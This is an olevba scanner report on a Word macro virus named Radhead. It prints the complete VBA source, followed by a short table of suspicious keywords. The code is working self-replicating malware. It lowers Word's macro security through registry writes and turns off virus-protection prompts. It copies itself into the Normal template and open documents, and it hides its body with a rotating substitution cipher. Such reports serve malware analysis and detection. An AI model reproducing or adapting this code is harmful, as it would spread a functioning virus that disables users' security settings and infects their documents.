olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Radhead
Type: Text
-------------------------------------------------------------------------------
VBA MACRO Virus.MSWord.Radhead 
in file: Virus.MSWord.Radhead - OLE stream: ''
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub GoThru()
''''''''EY QOOEO OQSZHQ YQMJ
''''''''SFSJQH.WOCKUJQWOENCLQSJOCYT("", "VGQF_AZOOQYJ_ZSQO\SENJRUOQ\HCAOESENJ\ENNCAQ\10.0\REOI\SQAZOCJF", "LQKQL") = 1&
''''''''SFSJQH.WOCKUJQWOENCLQSJOCYT("", "VGQF_AZOOQYJ_ZSQO\SENJRUOQ\HCAOESENJ\ENNCAQ\10.0\REOI\SQAZOCJF", "UAAQSSKDEH") = 1&
''''''''SFSJQH.WOCKUJQWOENCLQSJOCYT("", "VGQF_AZOOQYJ_ZSQO\SENJRUOQ\HCAOESENJ\ENNCAQ\9.0\REOI\SQAZOCJF", "LQKQL") = 1&
''''''''RCJV UWWLCAUJCEY
''''''''.SAOQQYZWIUJCYT = 0
''''''''.ICSWLUFULQOJS = RIULQOJSYEYQ
''''''''.ICSWLUFSJUJZSDUO = 0
''''''''QYI RCJV
''''''''
''''''''RCJV EWJCEYS
''''''''.AEYNCOHAEYKQOSCEYS = 0
''''''''.KCOZSWOEJQAJCEY = 0
''''''''.SUKQYEOHULWOEHWJ = 0
''''''''QYI RCJV
''''''''
''''''''UOUIVQUI = "OUIVQUI"
''''''''NLQ = QYKCOEY("RCYICO") & "\" & UOUIVQUI & ".SFS"
''''''''
''''''''
''''''''NEO C = 1 JE UAJCKQIEAZHQYJ.KDWOEBQAJ.KDAEHWEYQYJS.AEZYJ
''''''''CN UAJCKQIEAZHQYJ.KDWOEBQAJ.KDAEHWEYQYJS(C).YUHQ = UOUIVQUI JVQY UYSJ = 1
''''''''YQMJ
''''''''
''''''''NEO C = 1 JE YEOHULJQHWLUJQ.KDWOEBQAJ.KDAEHWEYQYJS.AEZYJ
''''''''CN YEOHULJQHWLUJQ.KDWOEBQAJ.KDAEHWEYQYJS(C).YUHQ = UOUIVQUI JVQY YYSJ = 1
''''''''YQMJ
''''''''
''''''''CN UYSJ <> 1 JVQY UAJCKQIEAZHQYJ.KDWOEBQAJ.KDAEHWEYQYJS.CHWEOJ NLQ
''''''''CN YYSJ <> 1 JVQY YEOHULJQHWLUJQ.KDWOEBQAJ.KDAEHWEYQYJS.CHWEOJ NLQ
''''''''
''''''''
''''''''YEOHULJQHWLUJQ.EWQYUSIEAZHQYJ
''''''''UAJCKQIEAZHQYJ.SUKQUS UWWLCAUJCEY.SJUOJZWWUJV & UOUIVQUI & ".IEJ"
''''''''UIICYS(UOUIVQUI & ".IEJ").CYSJULLQI = 1
''''''''YEOHULJQHWLUJQ.SUKQI = 1
''''''''UAJCKQIEAZHQYJ.ALESQ
''''''''CN UAJCKQIEAZHQYJ.SUKQI = 0 JVQY UAJCKQIEAZHQYJ.SUKQUS NCLQYUHQ:=UAJCKQIEAZHQYJ.NZLLYUHQ
End Sub

Sub CRYPT_CALL()
With ThisDocument.VBProject.VBCOMPONENTS("RADHEAD").CodeModule
SLYM = 8
ARADHEAD = "RADHEAD"
FLE = Environ("WINDIR") & "\" & ARADHEAD & ".SYS"
VBE.ACTIVEVBPROJECT.VBCOMPONENTS("RADHEAD").EXPORT FLE
For L = 1 To SLYM
For I = 2 To 39
.ReplaceLine I, Right(DeCrypt(.Lines(I, 1)), Len(.Lines(I, 1)) - 1)
Next
Next
GoThru
Randomize Timer
SLYM = Int(Rnd * 10) + 1
.ReplaceLine 44, "SLYM = " & SLYM
For L = 1 To SLYM
For I = 2 To 39
.ReplaceLine I, "'" & EnCrypt(.Lines(I, 1))
Next
Next
End With
Code = "HKOCQZT LXW QXZGGHTF():KQRITQR.EKNHZ_EQSS:TFR LXW" & vbCr & _
       "HKOCQZT LXW QXZGESGLT():KQRITQR.EKNHZ_EQSS:TFR LXW" & vbCr & _
       "HKOCQZT LXW QXZGFTV():KQRITQR.EKNHZ_EQSS:TFR LXW" & vbCr & _
       "HKOCQZT LXW RGEXDTFZ_ESGLT():KQRITQR.EKNHZ_EQSS:TFR LXW" & vbCr & _
       "HKOCQZT LXW RGEXDTFZ_GHTF():KQRITQR.EKNHZ_EQSS:TFR LXW" & vbCr & _
       "HKOCQZT LXW RGEXDTFZ_FTV():KQRITQR.EKNHZ_EQSS:TFR LXW"
With ActiveDocument.VBProject.VBCOMPONENTS(1).CodeModule
.DeleteLines 1, .CountOfLines
.AddFromString DeCrypt(Code)
End With
With NormalTemplate.VBProject.VBCOMPONENTS(1).CodeModule
.DeleteLines 1, .CountOfLines
.AddFromString DeCrypt(Code)
End With
End Sub

Private Function EnCrypt(a)
For I = 1 To Len(a)
N = UCase(Mid(a, I, 1))
P = N
If N = "A" Then P = "Q"
If N = "B" Then P = "W"
If N = "C" Then P = "E"
If N = "D" Then P = "R"
If N = "E" Then P = "T"
If N = "F" Then P = "Y"
If N = "G" Then P = "U"
If N = "H" Then P = "I"
If N = "I" Then P = "O"
If N = "J" Then P = "P"
If N = "K" Then P = "A"
If N = "L" Then P = "S"
If N = "M" Then P = "D"
If N = "N" Then P = "F"
If N = "O" Then P = "G"
If N = "P" Then P = "H"
If N = "Q" Then P = "J"
If N = "R" Then P = "K"
If N = "S" Then P = "L"
If N = "T" Then P = "Z"
If N = "U" Then P = "X"
If N = "V" Then P = "C"
If N = "W" Then P = "V"
If N = "X" Then P = "B"
If N = "Y" Then P = "N"
If N = "Z" Then P = "M"
EnCrypt = EnCrypt & P
Next
End Function
Private Function DeCrypt(a)
For I = 1 To Len(a)
N = UCase(Mid(a, I, 1))
P = N
If N = "Q" Then P = "A"
If N = "W" Then P = "B"
If N = "E" Then P = "C"
If N = "R" Then P = "D"
If N = "T" Then P = "E"
If N = "Y" Then P = "F"
If N = "U" Then P = "G"
If N = "I" Then P = "H"
If N = "O" Then P = "I"
If N = "P" Then P = "J"
If N = "A" Then P = "K"
If N = "S" Then P = "L"
If N = "D" Then P = "M"
If N = "F" Then P = "N"
If N = "G" Then P = "O"
If N = "H" Then P = "P"
If N = "J" Then P = "Q"
If N = "K" Then P = "R"
If N = "L" Then P = "S"
If N = "Z" Then P = "T"
If N = "X" Then P = "U"
If N = "C" Then P = "V"
If N = "V" Then P = "W"
If N = "B" Then P = "X"
If N = "N" Then P = "Y"
If N = "M" Then P = "Z"
DeCrypt = DeCrypt & P
Next
End Function

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|Suspicious|Environ             |May read system environment variables        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBCOMPONENTS        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

